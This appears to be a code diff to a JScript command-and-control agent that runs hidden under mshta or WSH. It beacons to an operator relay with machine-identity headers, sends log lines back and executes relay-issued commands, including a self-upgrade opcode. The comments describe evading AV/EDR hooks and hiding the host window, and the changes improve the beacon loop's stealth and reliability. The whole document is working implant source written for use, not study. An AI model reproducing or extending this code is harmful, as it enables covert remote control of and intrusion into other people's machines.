@@ -1,38 +1,66 @@
 function runAgent() {
     var shell = null, identityHeaders = null, exiting = false;
     var clrVersion = 'v4.0.30319';
+    // ── host mode ───────────────────────────────────────────────────────────
+    // mshta (the deployment host) runs script on a windowed IE engine with a
+    // slow-script watchdog: ONE activation that never yields pops the modal
+    // "...causing the program to run slowly / Stop running this script?" alert —
+    // and since the host master hides its window first, that modal is INVISIBLE
+    // and blocking: the beacon loop didn't look slow, it FROZE waiting for a
+    // click nobody could make. MSHTA mode restructures the loop around
+    // setTimeout — every cycle a fresh activation (the watchdog's statement
+    // counter resets, mshta pumps messages between cycles) — and peeks the
+    // async transport on a 50 ms tick instead of blocking it. WSH (cscript /
+    // wscript, the verification hosts) has no watchdog and no timers: there the
+    // loop stays fully SYNCHRONOUS, byte-identical in behavior to the old
+    // while-loop — open(..., false), blocking send, same fatal contract.
+    var MSHTA = (typeof setTimeout !== 'undefined') && (typeof WScript === 'undefined');
+    function later(fn) { setTimeout(fn, 1); }
     function ensureShell() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
     }
     // log() = relay ship ONLY (zero local echo — no Echo, no alert, no dbg).
     // Every line is POSTed with X-Agent-Log: 1: the relay answers immediately
     // (no long-poll hold) and broadcasts an agent_log event to the operator's
-    // events feed. NEVER fatal — a failed ship is swallowed in silence — and the
-    // in-ship guard keeps a failing relay from recursing. Body = one frame holding
-    // the line (UTF-8-ish: chars are masked to a byte). Each call is one
-    // synchronous round-trip that stalls the agent loop — keep log() calls to
-    // milestones, never inside tight loops.
-    var inShip = false;
+    // events feed. NEVER fatal — a failed ship is swallowed in silence. Body =
+    // one frame holding the line (UTF-8-ish: chars are masked to a byte).
+    // Ships are FIRE-AND-FORGET: the transport opens async and is never waited
+    // on, so a ship no longer stalls the loop with a synchronous round-trip —
+    // keep log() calls to milestones either way. Each ship keeps BOTH the xhr
+    // (a RELEASED WinHttpRequest cancels its own in-flight send) and the body
+    // safearray (see sendBody — async send consumes it on a winhttp thread)
+    // alive in logShips until a zero-timeout peek reaps it once per cycle; the
+    // cap bounds a chatty command to 3 open sockets, dropping lines beyond it
+    // (log is best-effort — a ship still in flight when the agent finishes
+    // dies with the process).
+    var logShips = [];
     function log(line) {
         postLog(line);
     }
+    function reapLogShips() {
+        for (var i = logShips.length - 1; i >= 0; i--) {
+            var finished = true;
+            try { finished = logShips[i].x.waitForResponse(0); } catch (e0) {}
+            if (finished) logShips.splice(i, 1);
+        }
+    }
     function postLog(line) {
-        if (inShip || !beaconUrl || !identityHeaders) return;
-        inShip = true;
+        if (!beaconUrl || !identityHeaders) return;
+        reapLogShips();
+        if (logShips.length >= 3) return;
         try {
             var bytes = [];
             for (var i = 0; i < line.length; i++) bytes.push(line.charCodeAt(i) & 255);
-            var xhr = makeTransport();
+            var xhr = makeTransport(true);
             if (!xhr) return;
-            try { xhr.setProxy(1, '', ''); } catch (e0) {}
-            try { xhr.setTimeouts(10000, 10000, 15000, 15000); } catch (e0b) {}
+            try { xhr.setProxy(1, '', ''); } catch (e1) {}
+            try { xhr.setTimeouts(10000, 10000, 15000, 15000); } catch (e1b) {}
             for (var h = 0; h < identityHeaders.length; h++) {
-                try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e1) {}
+                try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e2) {}
             }
             xhr.setRequestHeader('X-Agent-Log', '1');
-            sendBody(xhr, buildBodyStream([bytes]));
-        } catch (e) {
-        } finally { inShip = false; }
+            logShips.push({ x: xhr, b: sendBody(xhr, buildBodyStream([bytes])) });
+        } catch (e3) {}
     }
     function readEnv(name) {
         ensureShell();
@@ -44,18 +72,30 @@ function runAgent() {
     // path: immune both to the IE-zone denials plain XMLHTTP suffers and to the
     // AV/EDR hooks and DLL policy that deny the msxml3/msxml6 ServerXMLHTTP
     // classes on hardened boxes (0x80070005 "Access is denied" at open()).
-    // Sync-only — all this loop needs. One API difference from the MSXML
-    // objects: send() takes a BSTR or a UI1 safearray, never an ADODB.Stream —
-    // sendBody() reads the stream into its safearray.
-    function makeTransport() {
+    // SYNC for the WSH beacon (all that loop needs); ASYNC for the mshta
+    // beacon (the loop peeks — a blocking send would park the windowed host's
+    // one thread) and for every log ship (fire-and-forget). One API difference
+    // from the MSXML objects: send() takes a BSTR or a UI1 safearray, never an
+    // ADODB.Stream — sendBody() reads the stream into its safearray.
+    function makeTransport(asyncMode) {
         try {
             var t = new ActiveXObject('WinHttp.WinHttpRequest.5.1');
-            t.open('POST', beaconUrl, false);
+            t.open('POST', beaconUrl, asyncMode ? true : false);
             return t;
         } catch (e) { return null; }
     }
+    // send()'s body must OUTLIVE an ASYNC send: winhttp consumes the safearray
+    // on its own worker thread AFTER send() returns, and a released array is a
+    // use-after-free — mshta's idle-time GC collected it within seconds of the
+    // first ships (bodies arrived EMPTY, then the process crashed outright
+    // mid-response). The SYNC WSH beacon is immune (send consumes the body
+    // before returning); every async caller retains the RETURNED variant until
+    // its request completes or is reaped.
     function sendBody(xhr, stream) {
-        xhr.send(stream ? stream.Read() : '');
+        if (!stream) { xhr.send(''); return null; }
+        var arr = stream.Read();
+        xhr.send(arr);
+        return arr;
     }
     function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
     // ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
@@ -70,9 +110,17 @@ function runAgent() {
     //           to 1 and hand the stream to xhr.send().
     //   READ  — Write(responseBody), then ReadText: MLang's 'iso-8859-1'/'windows-
     //           1252' READ decodes bytes 0x80-0x9F as their cp1252 Unicode chars
-    //           (U+20AC etc); CP1252_INVERSE maps those 27 chars back to bytes.
-    //           Everything else decodes 1:1. All 256 byte values round-trip
-    //           (verified under cscript against a live HTTP listener).
+    //           (U+20AC etc); the fix-up below maps those 27 chars back to bytes.
+    // The READ side stays a STRING end-to-end: ReadText already yields one JS
+    // char per byte, and every per-byte script loop is exactly what trips the
+    // mshta slow-script watchdog on big command frames (a multi-MB upgrade blob
+    // is tens of millions of statements in ONE activation) — so the cp1252
+    // fix-up runs as ONE native replace() whose callback fires only for the 27
+    // mapped chars, and frame slicing is engine-internal substring work. Bytes
+    // 0x00-0x7F and 0xA0-0xFF decode 1:1 (char == byte); the undefined cp1252
+    // slots (0x81/0x8D/0x8F/0x90/0x9D) pass through as their C1 chars —
+    // charCodeAt == byte in every case. All 256 byte values round-trip
+    // (verified under cscript against a live HTTP listener).
     //   An EMPTY response body must NOT go through the stream (converting a
     //   zero-length stream throws) — gate on Content-Length first.
     function bytesToBinString(bytes) {
@@ -107,7 +155,13 @@ function runAgent() {
         0x2013: 0x96, 0x2014: 0x97, 0x02DC: 0x98, 0x2122: 0x99, 0x0161: 0x9A, 0x203A: 0x9B,
         0x0153: 0x9C, 0x017E: 0x9E, 0x0178: 0x9F
     };
-    function responseToBytes(body) {
+    // The fix-up class is BUILT FROM the inverse table (one source of truth,
+    // so it can never drift from it) — and the source stays pure ASCII: literal
+    // non-ASCII regex characters would depend on how the host decodes the file.
+    var CP1252_CHARS = '';
+    for (var cpk in CP1252_INVERSE) CP1252_CHARS += String.fromCharCode(parseInt(cpk, 10));
+    var CP1252_FIXUP = new RegExp('[' + CP1252_CHARS + ']', 'g');
+    function responseToText(body) {
         var stream = new ActiveXObject('ADODB.Stream');
         stream.Type = 1;
         stream.Open();
@@ -117,19 +171,16 @@ function runAgent() {
         stream.Charset = 'windows-1252';
         var text = stream.ReadText(-1);
         stream.Close();
-        var bytes = [];
-        for (var i = 0; i < text.length; i++) {
-            var c = text.charCodeAt(i);
-            bytes.push(CP1252_INVERSE[c] !== undefined ? CP1252_INVERSE[c] : (c & 255));
-        }
-        return bytes;
+        return text.replace(CP1252_FIXUP, function (c) {
+            return String.fromCharCode(CP1252_INVERSE[c.charCodeAt(0)]);
+        });
     }
-    function parseFrames(bytes) {
+    function parseFrames(text) {
         var frames = [], i = 0;
-        while (i + 4 <= bytes.length) {
-            var len = (bytes[i] | (bytes[i + 1] << 8) | (bytes[i + 2] << 16) | (bytes[i + 3] << 24)) >>> 0;
+        while (i + 4 <= text.length) {
+            var len = (text.charCodeAt(i) | (text.charCodeAt(i + 1) << 8) | (text.charCodeAt(i + 2) << 16) | (text.charCodeAt(i + 3) << 24)) >>> 0;
             i += 4;
-            frames.push(bytes.slice(i, i + len));
+            frames.push(text.slice(i, i + len));
             i += len;
         }
         return frames;
@@ -265,7 +316,7 @@ function runAgent() {
         addHeader('X-Agent-Build', buildNumber);
         return headers;
     }
-    function dispatchCommand(bytes) {
+    function dispatchCommand(frame) {
         function base64Length(base64) {
             var padding = 0;
             if (base64.charAt(base64.length - 1) == '=') padding++;
@@ -274,19 +325,16 @@ function runAgent() {
         }
         // Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id
         // after its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
-        var corrId = bytes.length >= 5
-            ? ((bytes[1] | (bytes[2] << 8) | (bytes[3] << 16) | (bytes[4] << 24)) >>> 0)
+        // Frames arrive as fixed-up STRINGS (see responseToText) — charCodeAt IS
+        // the byte, substring the payload.
+        var corrId = frame.length >= 5
+            ? ((frame.charCodeAt(1) | (frame.charCodeAt(2) << 8) | (frame.charCodeAt(3) << 16) | (frame.charCodeAt(4) << 24)) >>> 0)
             : 0;
         function reply(status) { return u32Bytes(status).concat(u32Bytes(corrId)); }
-        if (bytes[0] == 10) { exiting = true; return null; }
-        if (bytes[0] == 11) {
+        if (frame.charCodeAt(0) == 10) { exiting = true; return null; }
+        if (frame.charCodeAt(0) == 11) {
             try {
-                var payloadText = '';
-                for (var i = 5; i < bytes.length; i += 4096) {
-                    var chunk = '';
-                    for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
-                    payloadText += chunk;
-                }
+                var payloadText = frame.substring(5);
                 var headerEnd = payloadText.indexOf('\n\n');
                 var headerLines = (headerEnd >= 0 ? payloadText.substring(0, headerEnd) : '').split('\n');
                 var bodyText = headerEnd >= 0 ? payloadText.substring(headerEnd + 2) : '';
@@ -322,7 +370,7 @@ function runAgent() {
                 return reply(0);
             } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return reply(1); }
         }
-        log('command opcode ' + bytes[0] + ' unknown — replying status 2');
+        log('command opcode ' + frame.charCodeAt(0) + ' unknown — replying status 2');
         return reply(2);
     }
     ensureShell();
@@ -334,34 +382,104 @@ function runAgent() {
         if (identityHeaders[u][0] == 'X-Agent-Machine-Uuid') uuidForLog = identityHeaders[u][1];
     log('JScript agent beaconing to ' + beaconUrl + ' as ' + (uuidForLog || 'an unidentified machine'));
     var pendingReplies = [];
-    while (!exiting) {
-        var xhr = null;
-        try {
-            xhr = makeTransport();
-            if (!xhr) return 'fail';
-            try { xhr.setProxy(1, '', ''); } catch (e2) {}
-            try { xhr.setTimeouts(10000, 10000, 15000, 45000); } catch (e2b) {}
-            for (var i = 0; i < identityHeaders.length; i++) {
-                try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e3) {}
-            }
-            sendBody(xhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
-        } catch (e) {
-            return 'fail';
-        }
-        if (xhr.status != 200) {
-            log('http ' + xhr.status);
-            return 'fail';
-        }
+    // ── the beacon loop ─────────────────────────────────────────────────────
+    // One cycle = one POST (carrying every reply owed since the last one) +
+    // parse + dispatch; 'continue' means re-POST. WSH drives cycles from a
+    // plain synchronous while — byte-identical to the old loop. mshta splits
+    // the same cycle into prepare → async send → 50 ms zero-timeout peeks,
+    // every step entered through setTimeout so no activation outlives one
+    // cycle. Completion under mshta is the HOST HOOK onAgentDone(status) —
+    // the async twin of the return value, called only if the host defined
+    // one (the master then quits; without the hook the loop just ends).
+    // runAgent itself returns 'async' right after scheduling — the master's
+    // cue to skip its own synchronous quitHost().
+    function finish(status) {
+        if (MSHTA && typeof onAgentDone == 'function') { try { onAgentDone(status); } catch (e0) {} }
+        return status;
+    }
+    function handleResponse(xhr) {
+        var status = 0;
+        try { status = xhr.status; } catch (e1) { return 'fail'; }
+        if (status != 200) { log('http ' + status); return 'fail'; }
         pendingReplies = [];
         // Empty answer = nothing queued — re-POST immediately. The stream conversion
         // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
-        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { log('idle — empty answer'); continue; }
-        var frames = parseFrames(responseToBytes(xhr.responseBody));
+        var contentLength = 0;
+        try { contentLength = parseInt(xhr.getResponseHeader('Content-Length') || '0', 10); } catch (e2) {}
+        if (contentLength == 0) { log('idle — empty answer'); return 'continue'; }
+        var frames = parseFrames(responseToText(xhr.responseBody));
         for (var f = 0; f < frames.length && !exiting; f++) {
             var replyBytes = dispatchCommand(frames[f]);
             if (exiting) { log('exit'); return 'exit'; }
             if (replyBytes) pendingReplies.push(replyBytes);
         }
+        return 'continue';
     }
-    return 'exit';
+    function prepareRequest() {
+        var xhr = makeTransport(MSHTA);
+        if (!xhr) return null;
+        try { xhr.setProxy(1, '', ''); } catch (e1) {}
+        try { xhr.setTimeouts(10000, 10000, 15000, 45000); } catch (e1b) {}
+        for (var i = 0; i < identityHeaders.length; i++) {
+            try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e2) {}
+        }
+        return xhr;
+    }
+    function wshCycle() {
+        reapLogShips();
+        var xhr = null;
+        try {
+            xhr = prepareRequest();
+            if (!xhr) return 'fail';
+            sendBody(xhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
+        } catch (e) {
+            return 'fail';
+        }
+        return handleResponse(xhr);
+    }
+    if (MSHTA) {
+        var pollXhr = null, pollBody = null, pollDeadline = 0;
+        function mshtaCycle() {
+            reapLogShips();
+            try {
+                pollXhr = prepareRequest();
+                if (!pollXhr) { finish('fail'); return; }
+                // pollBody retains the body safearray for the async send (see
+                // sendBody) until the NEXT cycle replaces it — well past this
+                // request's completion.
+                pollBody = sendBody(pollXhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
+            } catch (e) {
+                finish('fail');
+                return;
+            }
+            // 90 s hard deadline: the SetTimeouts phases (10+10+15+45 s worst case)
+            // already bound the request — this is the async twin of those bounds,
+            // after which the request is abandoned as fatal (the WSH path gets the
+            // same guarantee implicitly inside its blocking send).
+            pollDeadline = new Date().getTime() + 90000;
+            later(mshtaPoll);
+        }
+        function mshtaPoll() {
+            var complete = false;
+            try { complete = pollXhr.waitForResponse(0); } catch (e0) { finish('fail'); return; }
+            if (!complete) {
+                if (new Date().getTime() > pollDeadline) {
+                    try { pollXhr.abort(); } catch (e1) {}
+                    finish('fail');
+                    return;
+                }
+                setTimeout(mshtaPoll, 50);
+                return;
+            }
+            var status = handleResponse(pollXhr);
+            if (status == 'continue') later(mshtaCycle);
+            else finish(status);
+        }
+        later(mshtaCycle);
+        return 'async';
+    }
+    while (true) {
+        var status = wshCycle();
+        if (status != 'continue') return finish(status);
+    }
 }
